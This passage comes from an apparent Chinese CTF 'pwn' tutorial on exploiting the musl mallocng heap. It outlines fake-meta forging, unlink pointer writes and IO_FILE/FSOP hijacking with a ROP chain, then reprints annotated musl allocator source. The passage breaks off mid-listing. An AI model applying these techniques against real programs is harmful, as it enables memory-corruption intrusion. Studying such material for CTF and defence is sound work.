title="pwn题常用技巧"></a>pwn题常用技巧</h2><p>一般有如下几种利用方法，核心原理都是构造假的<code>chunk</code> 索引到假的<code>group</code> 从而所引导假的<code>meta</code>或覆盖<code>group</code> 中指向<code>meta</code> 的指针 覆盖为假的<code>meta</code> ，然后使得假的<code>meta dequeue</code> 最终实现<code>unlink</code><br>(构造<code>fake_meta</code> 需要先泄露 <code>secret</code> 校验值)<br>1、伪造<code>meta</code> 后满足各种条件 使得其进入<code>dequeue</code> 通过<code>unlink</code>,构造<code>prev</code>,<code>next</code> 实现任意地址指针互写<br>通过任意地址互写指针，向<code>stdout_used</code> 写入我们伪造的<code>fake_stdout</code>地址， 通过<code>IO_FILE</code> 劫持程序执行流<br>到我们布置好的<code>fake_stdout</code> 上，可以找<code>IO_FILE</code> 里的一些函数<code>exit puts</code>在<code>fake_stdout</code>上布置<code>rop_chain</code>然后通过栈迁移的<code>gadget</code> 利用<code>FSOP</code> 劫持程序到布置的<code>fake_stdout</code>上<br>2、伪造<code>fake_meta</code> 也是任意地址指针互写，先进行布局使得 <code>fake_meta dequeue</code> 实现<code>unlink</code>，再利用指针互写 修改<code>fake_meta</code> 中的<code>mem</code>(<code>mem</code> 就是<code>group</code> 区域) ，把<code>mem</code> 修改为我们想要的地址，然后让<code>fake_meta</code> 通过<code>queue</code> 入队，可以实现任意地址分配的，然后同样是打 <code>IO_FILE</code> 通过修改<code>stdout stdin</code> 和<code>stderr</code> 结构体 劫持程序流</p><h2 id="补充：部分重要函数源码"><a href="#补充：部分重要函数源码" class="headerlink" title="补充：部分重要函数源码"></a>补充：部分重要函数源码</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 最大申请空间限制</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= 阈值 会直接通过mmap 申请空间</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//新mmap group 空间</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// 如果申请meta 失败 会把刚刚mmap 出来的group 回收</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// 回收group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group 地址</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group 头部 指向meta (g 为 meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmap的group last_idx默认值=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap 的申请的 sizeclass 都为63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap 内存记载数量++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则直接根据传入size，转换成size_classes的对应大小的 下标，</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果从ctx.active 中没找到对应的meta 会执行下面的if分支</span></span><br><span class="line"><span class="comment">    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// 如果在 ctx.active 没找到 就使用更大size group 的meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果当前group 不满足就会来到这里:</span></span><br><span class="line"><span class="comment">      alloc_slot 从group 中取出对应大小chunk 的idx</span></span><br><span class="line"><span class="comment">      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用</span></span><br><span class="line"><span class="comment">        再从队列中其他meta的group 中找</span></span><br><span class="line"><span class="comment">      如果队列中其他meta的group 有可利用的chunk,就使用</span></span><br><span class="line"><span class="comment">      如果没有就重新分配一个新的group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// 取出 sc 对应active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 从对应meta 中的group 取出 第idx号chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>!!! 关键: 一般分配先进入这个循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//这里只有mask=0时，first才会为0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//mask为0，first=0，无可用空闲chunk，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//如果是排它锁, 那么下面保证成功</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//成功找到并设置avail_mask之后,continue 后设置idx，然后跳出</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line">    如果</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>alloc_slot:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// 尝试从限制active 中找到合适可用的</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//把新meta 加入队列</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_avail:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk</span></span><br><span class="line"><span class="comment">        !!! free释放的chunk 不能马上被复用的 !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。</span></span><br><span class="line"><span class="comment">       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象</span></span><br><span class="line"><span class="comment">       若meta链表中没有，一般meta 的next和prev 都是指向自己</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，</span></span><br><span class="line">        <span class="comment">// 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// 如果这个meta 后还有meta 就切换到 下一个meta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// 页对齐</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// 这里是给 m的 avail_mask 打上标记</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="free-1"><a href="#free-1" class="headerlink" title="free:"></a>free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 通过chunk p 用get_meta得到对应的meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// 得到对应chunk的 idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// 得到sizeclasses 中对应chunk类型的size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//算出真实大小</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span class="comment">//设置bitmap 标志</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// 将释放的chunk 和 现在可用的 chunk 加起来</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收</span></span><br><span class="line">        <span class="comment">// 此group 会被弹出队列</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// 设置free_mask 表示chunk 被释放</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// 含有meta 操作 ，内有unlink 是漏洞利用的关键</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta:"></a>get_meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free:"></a>nontrivial_free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 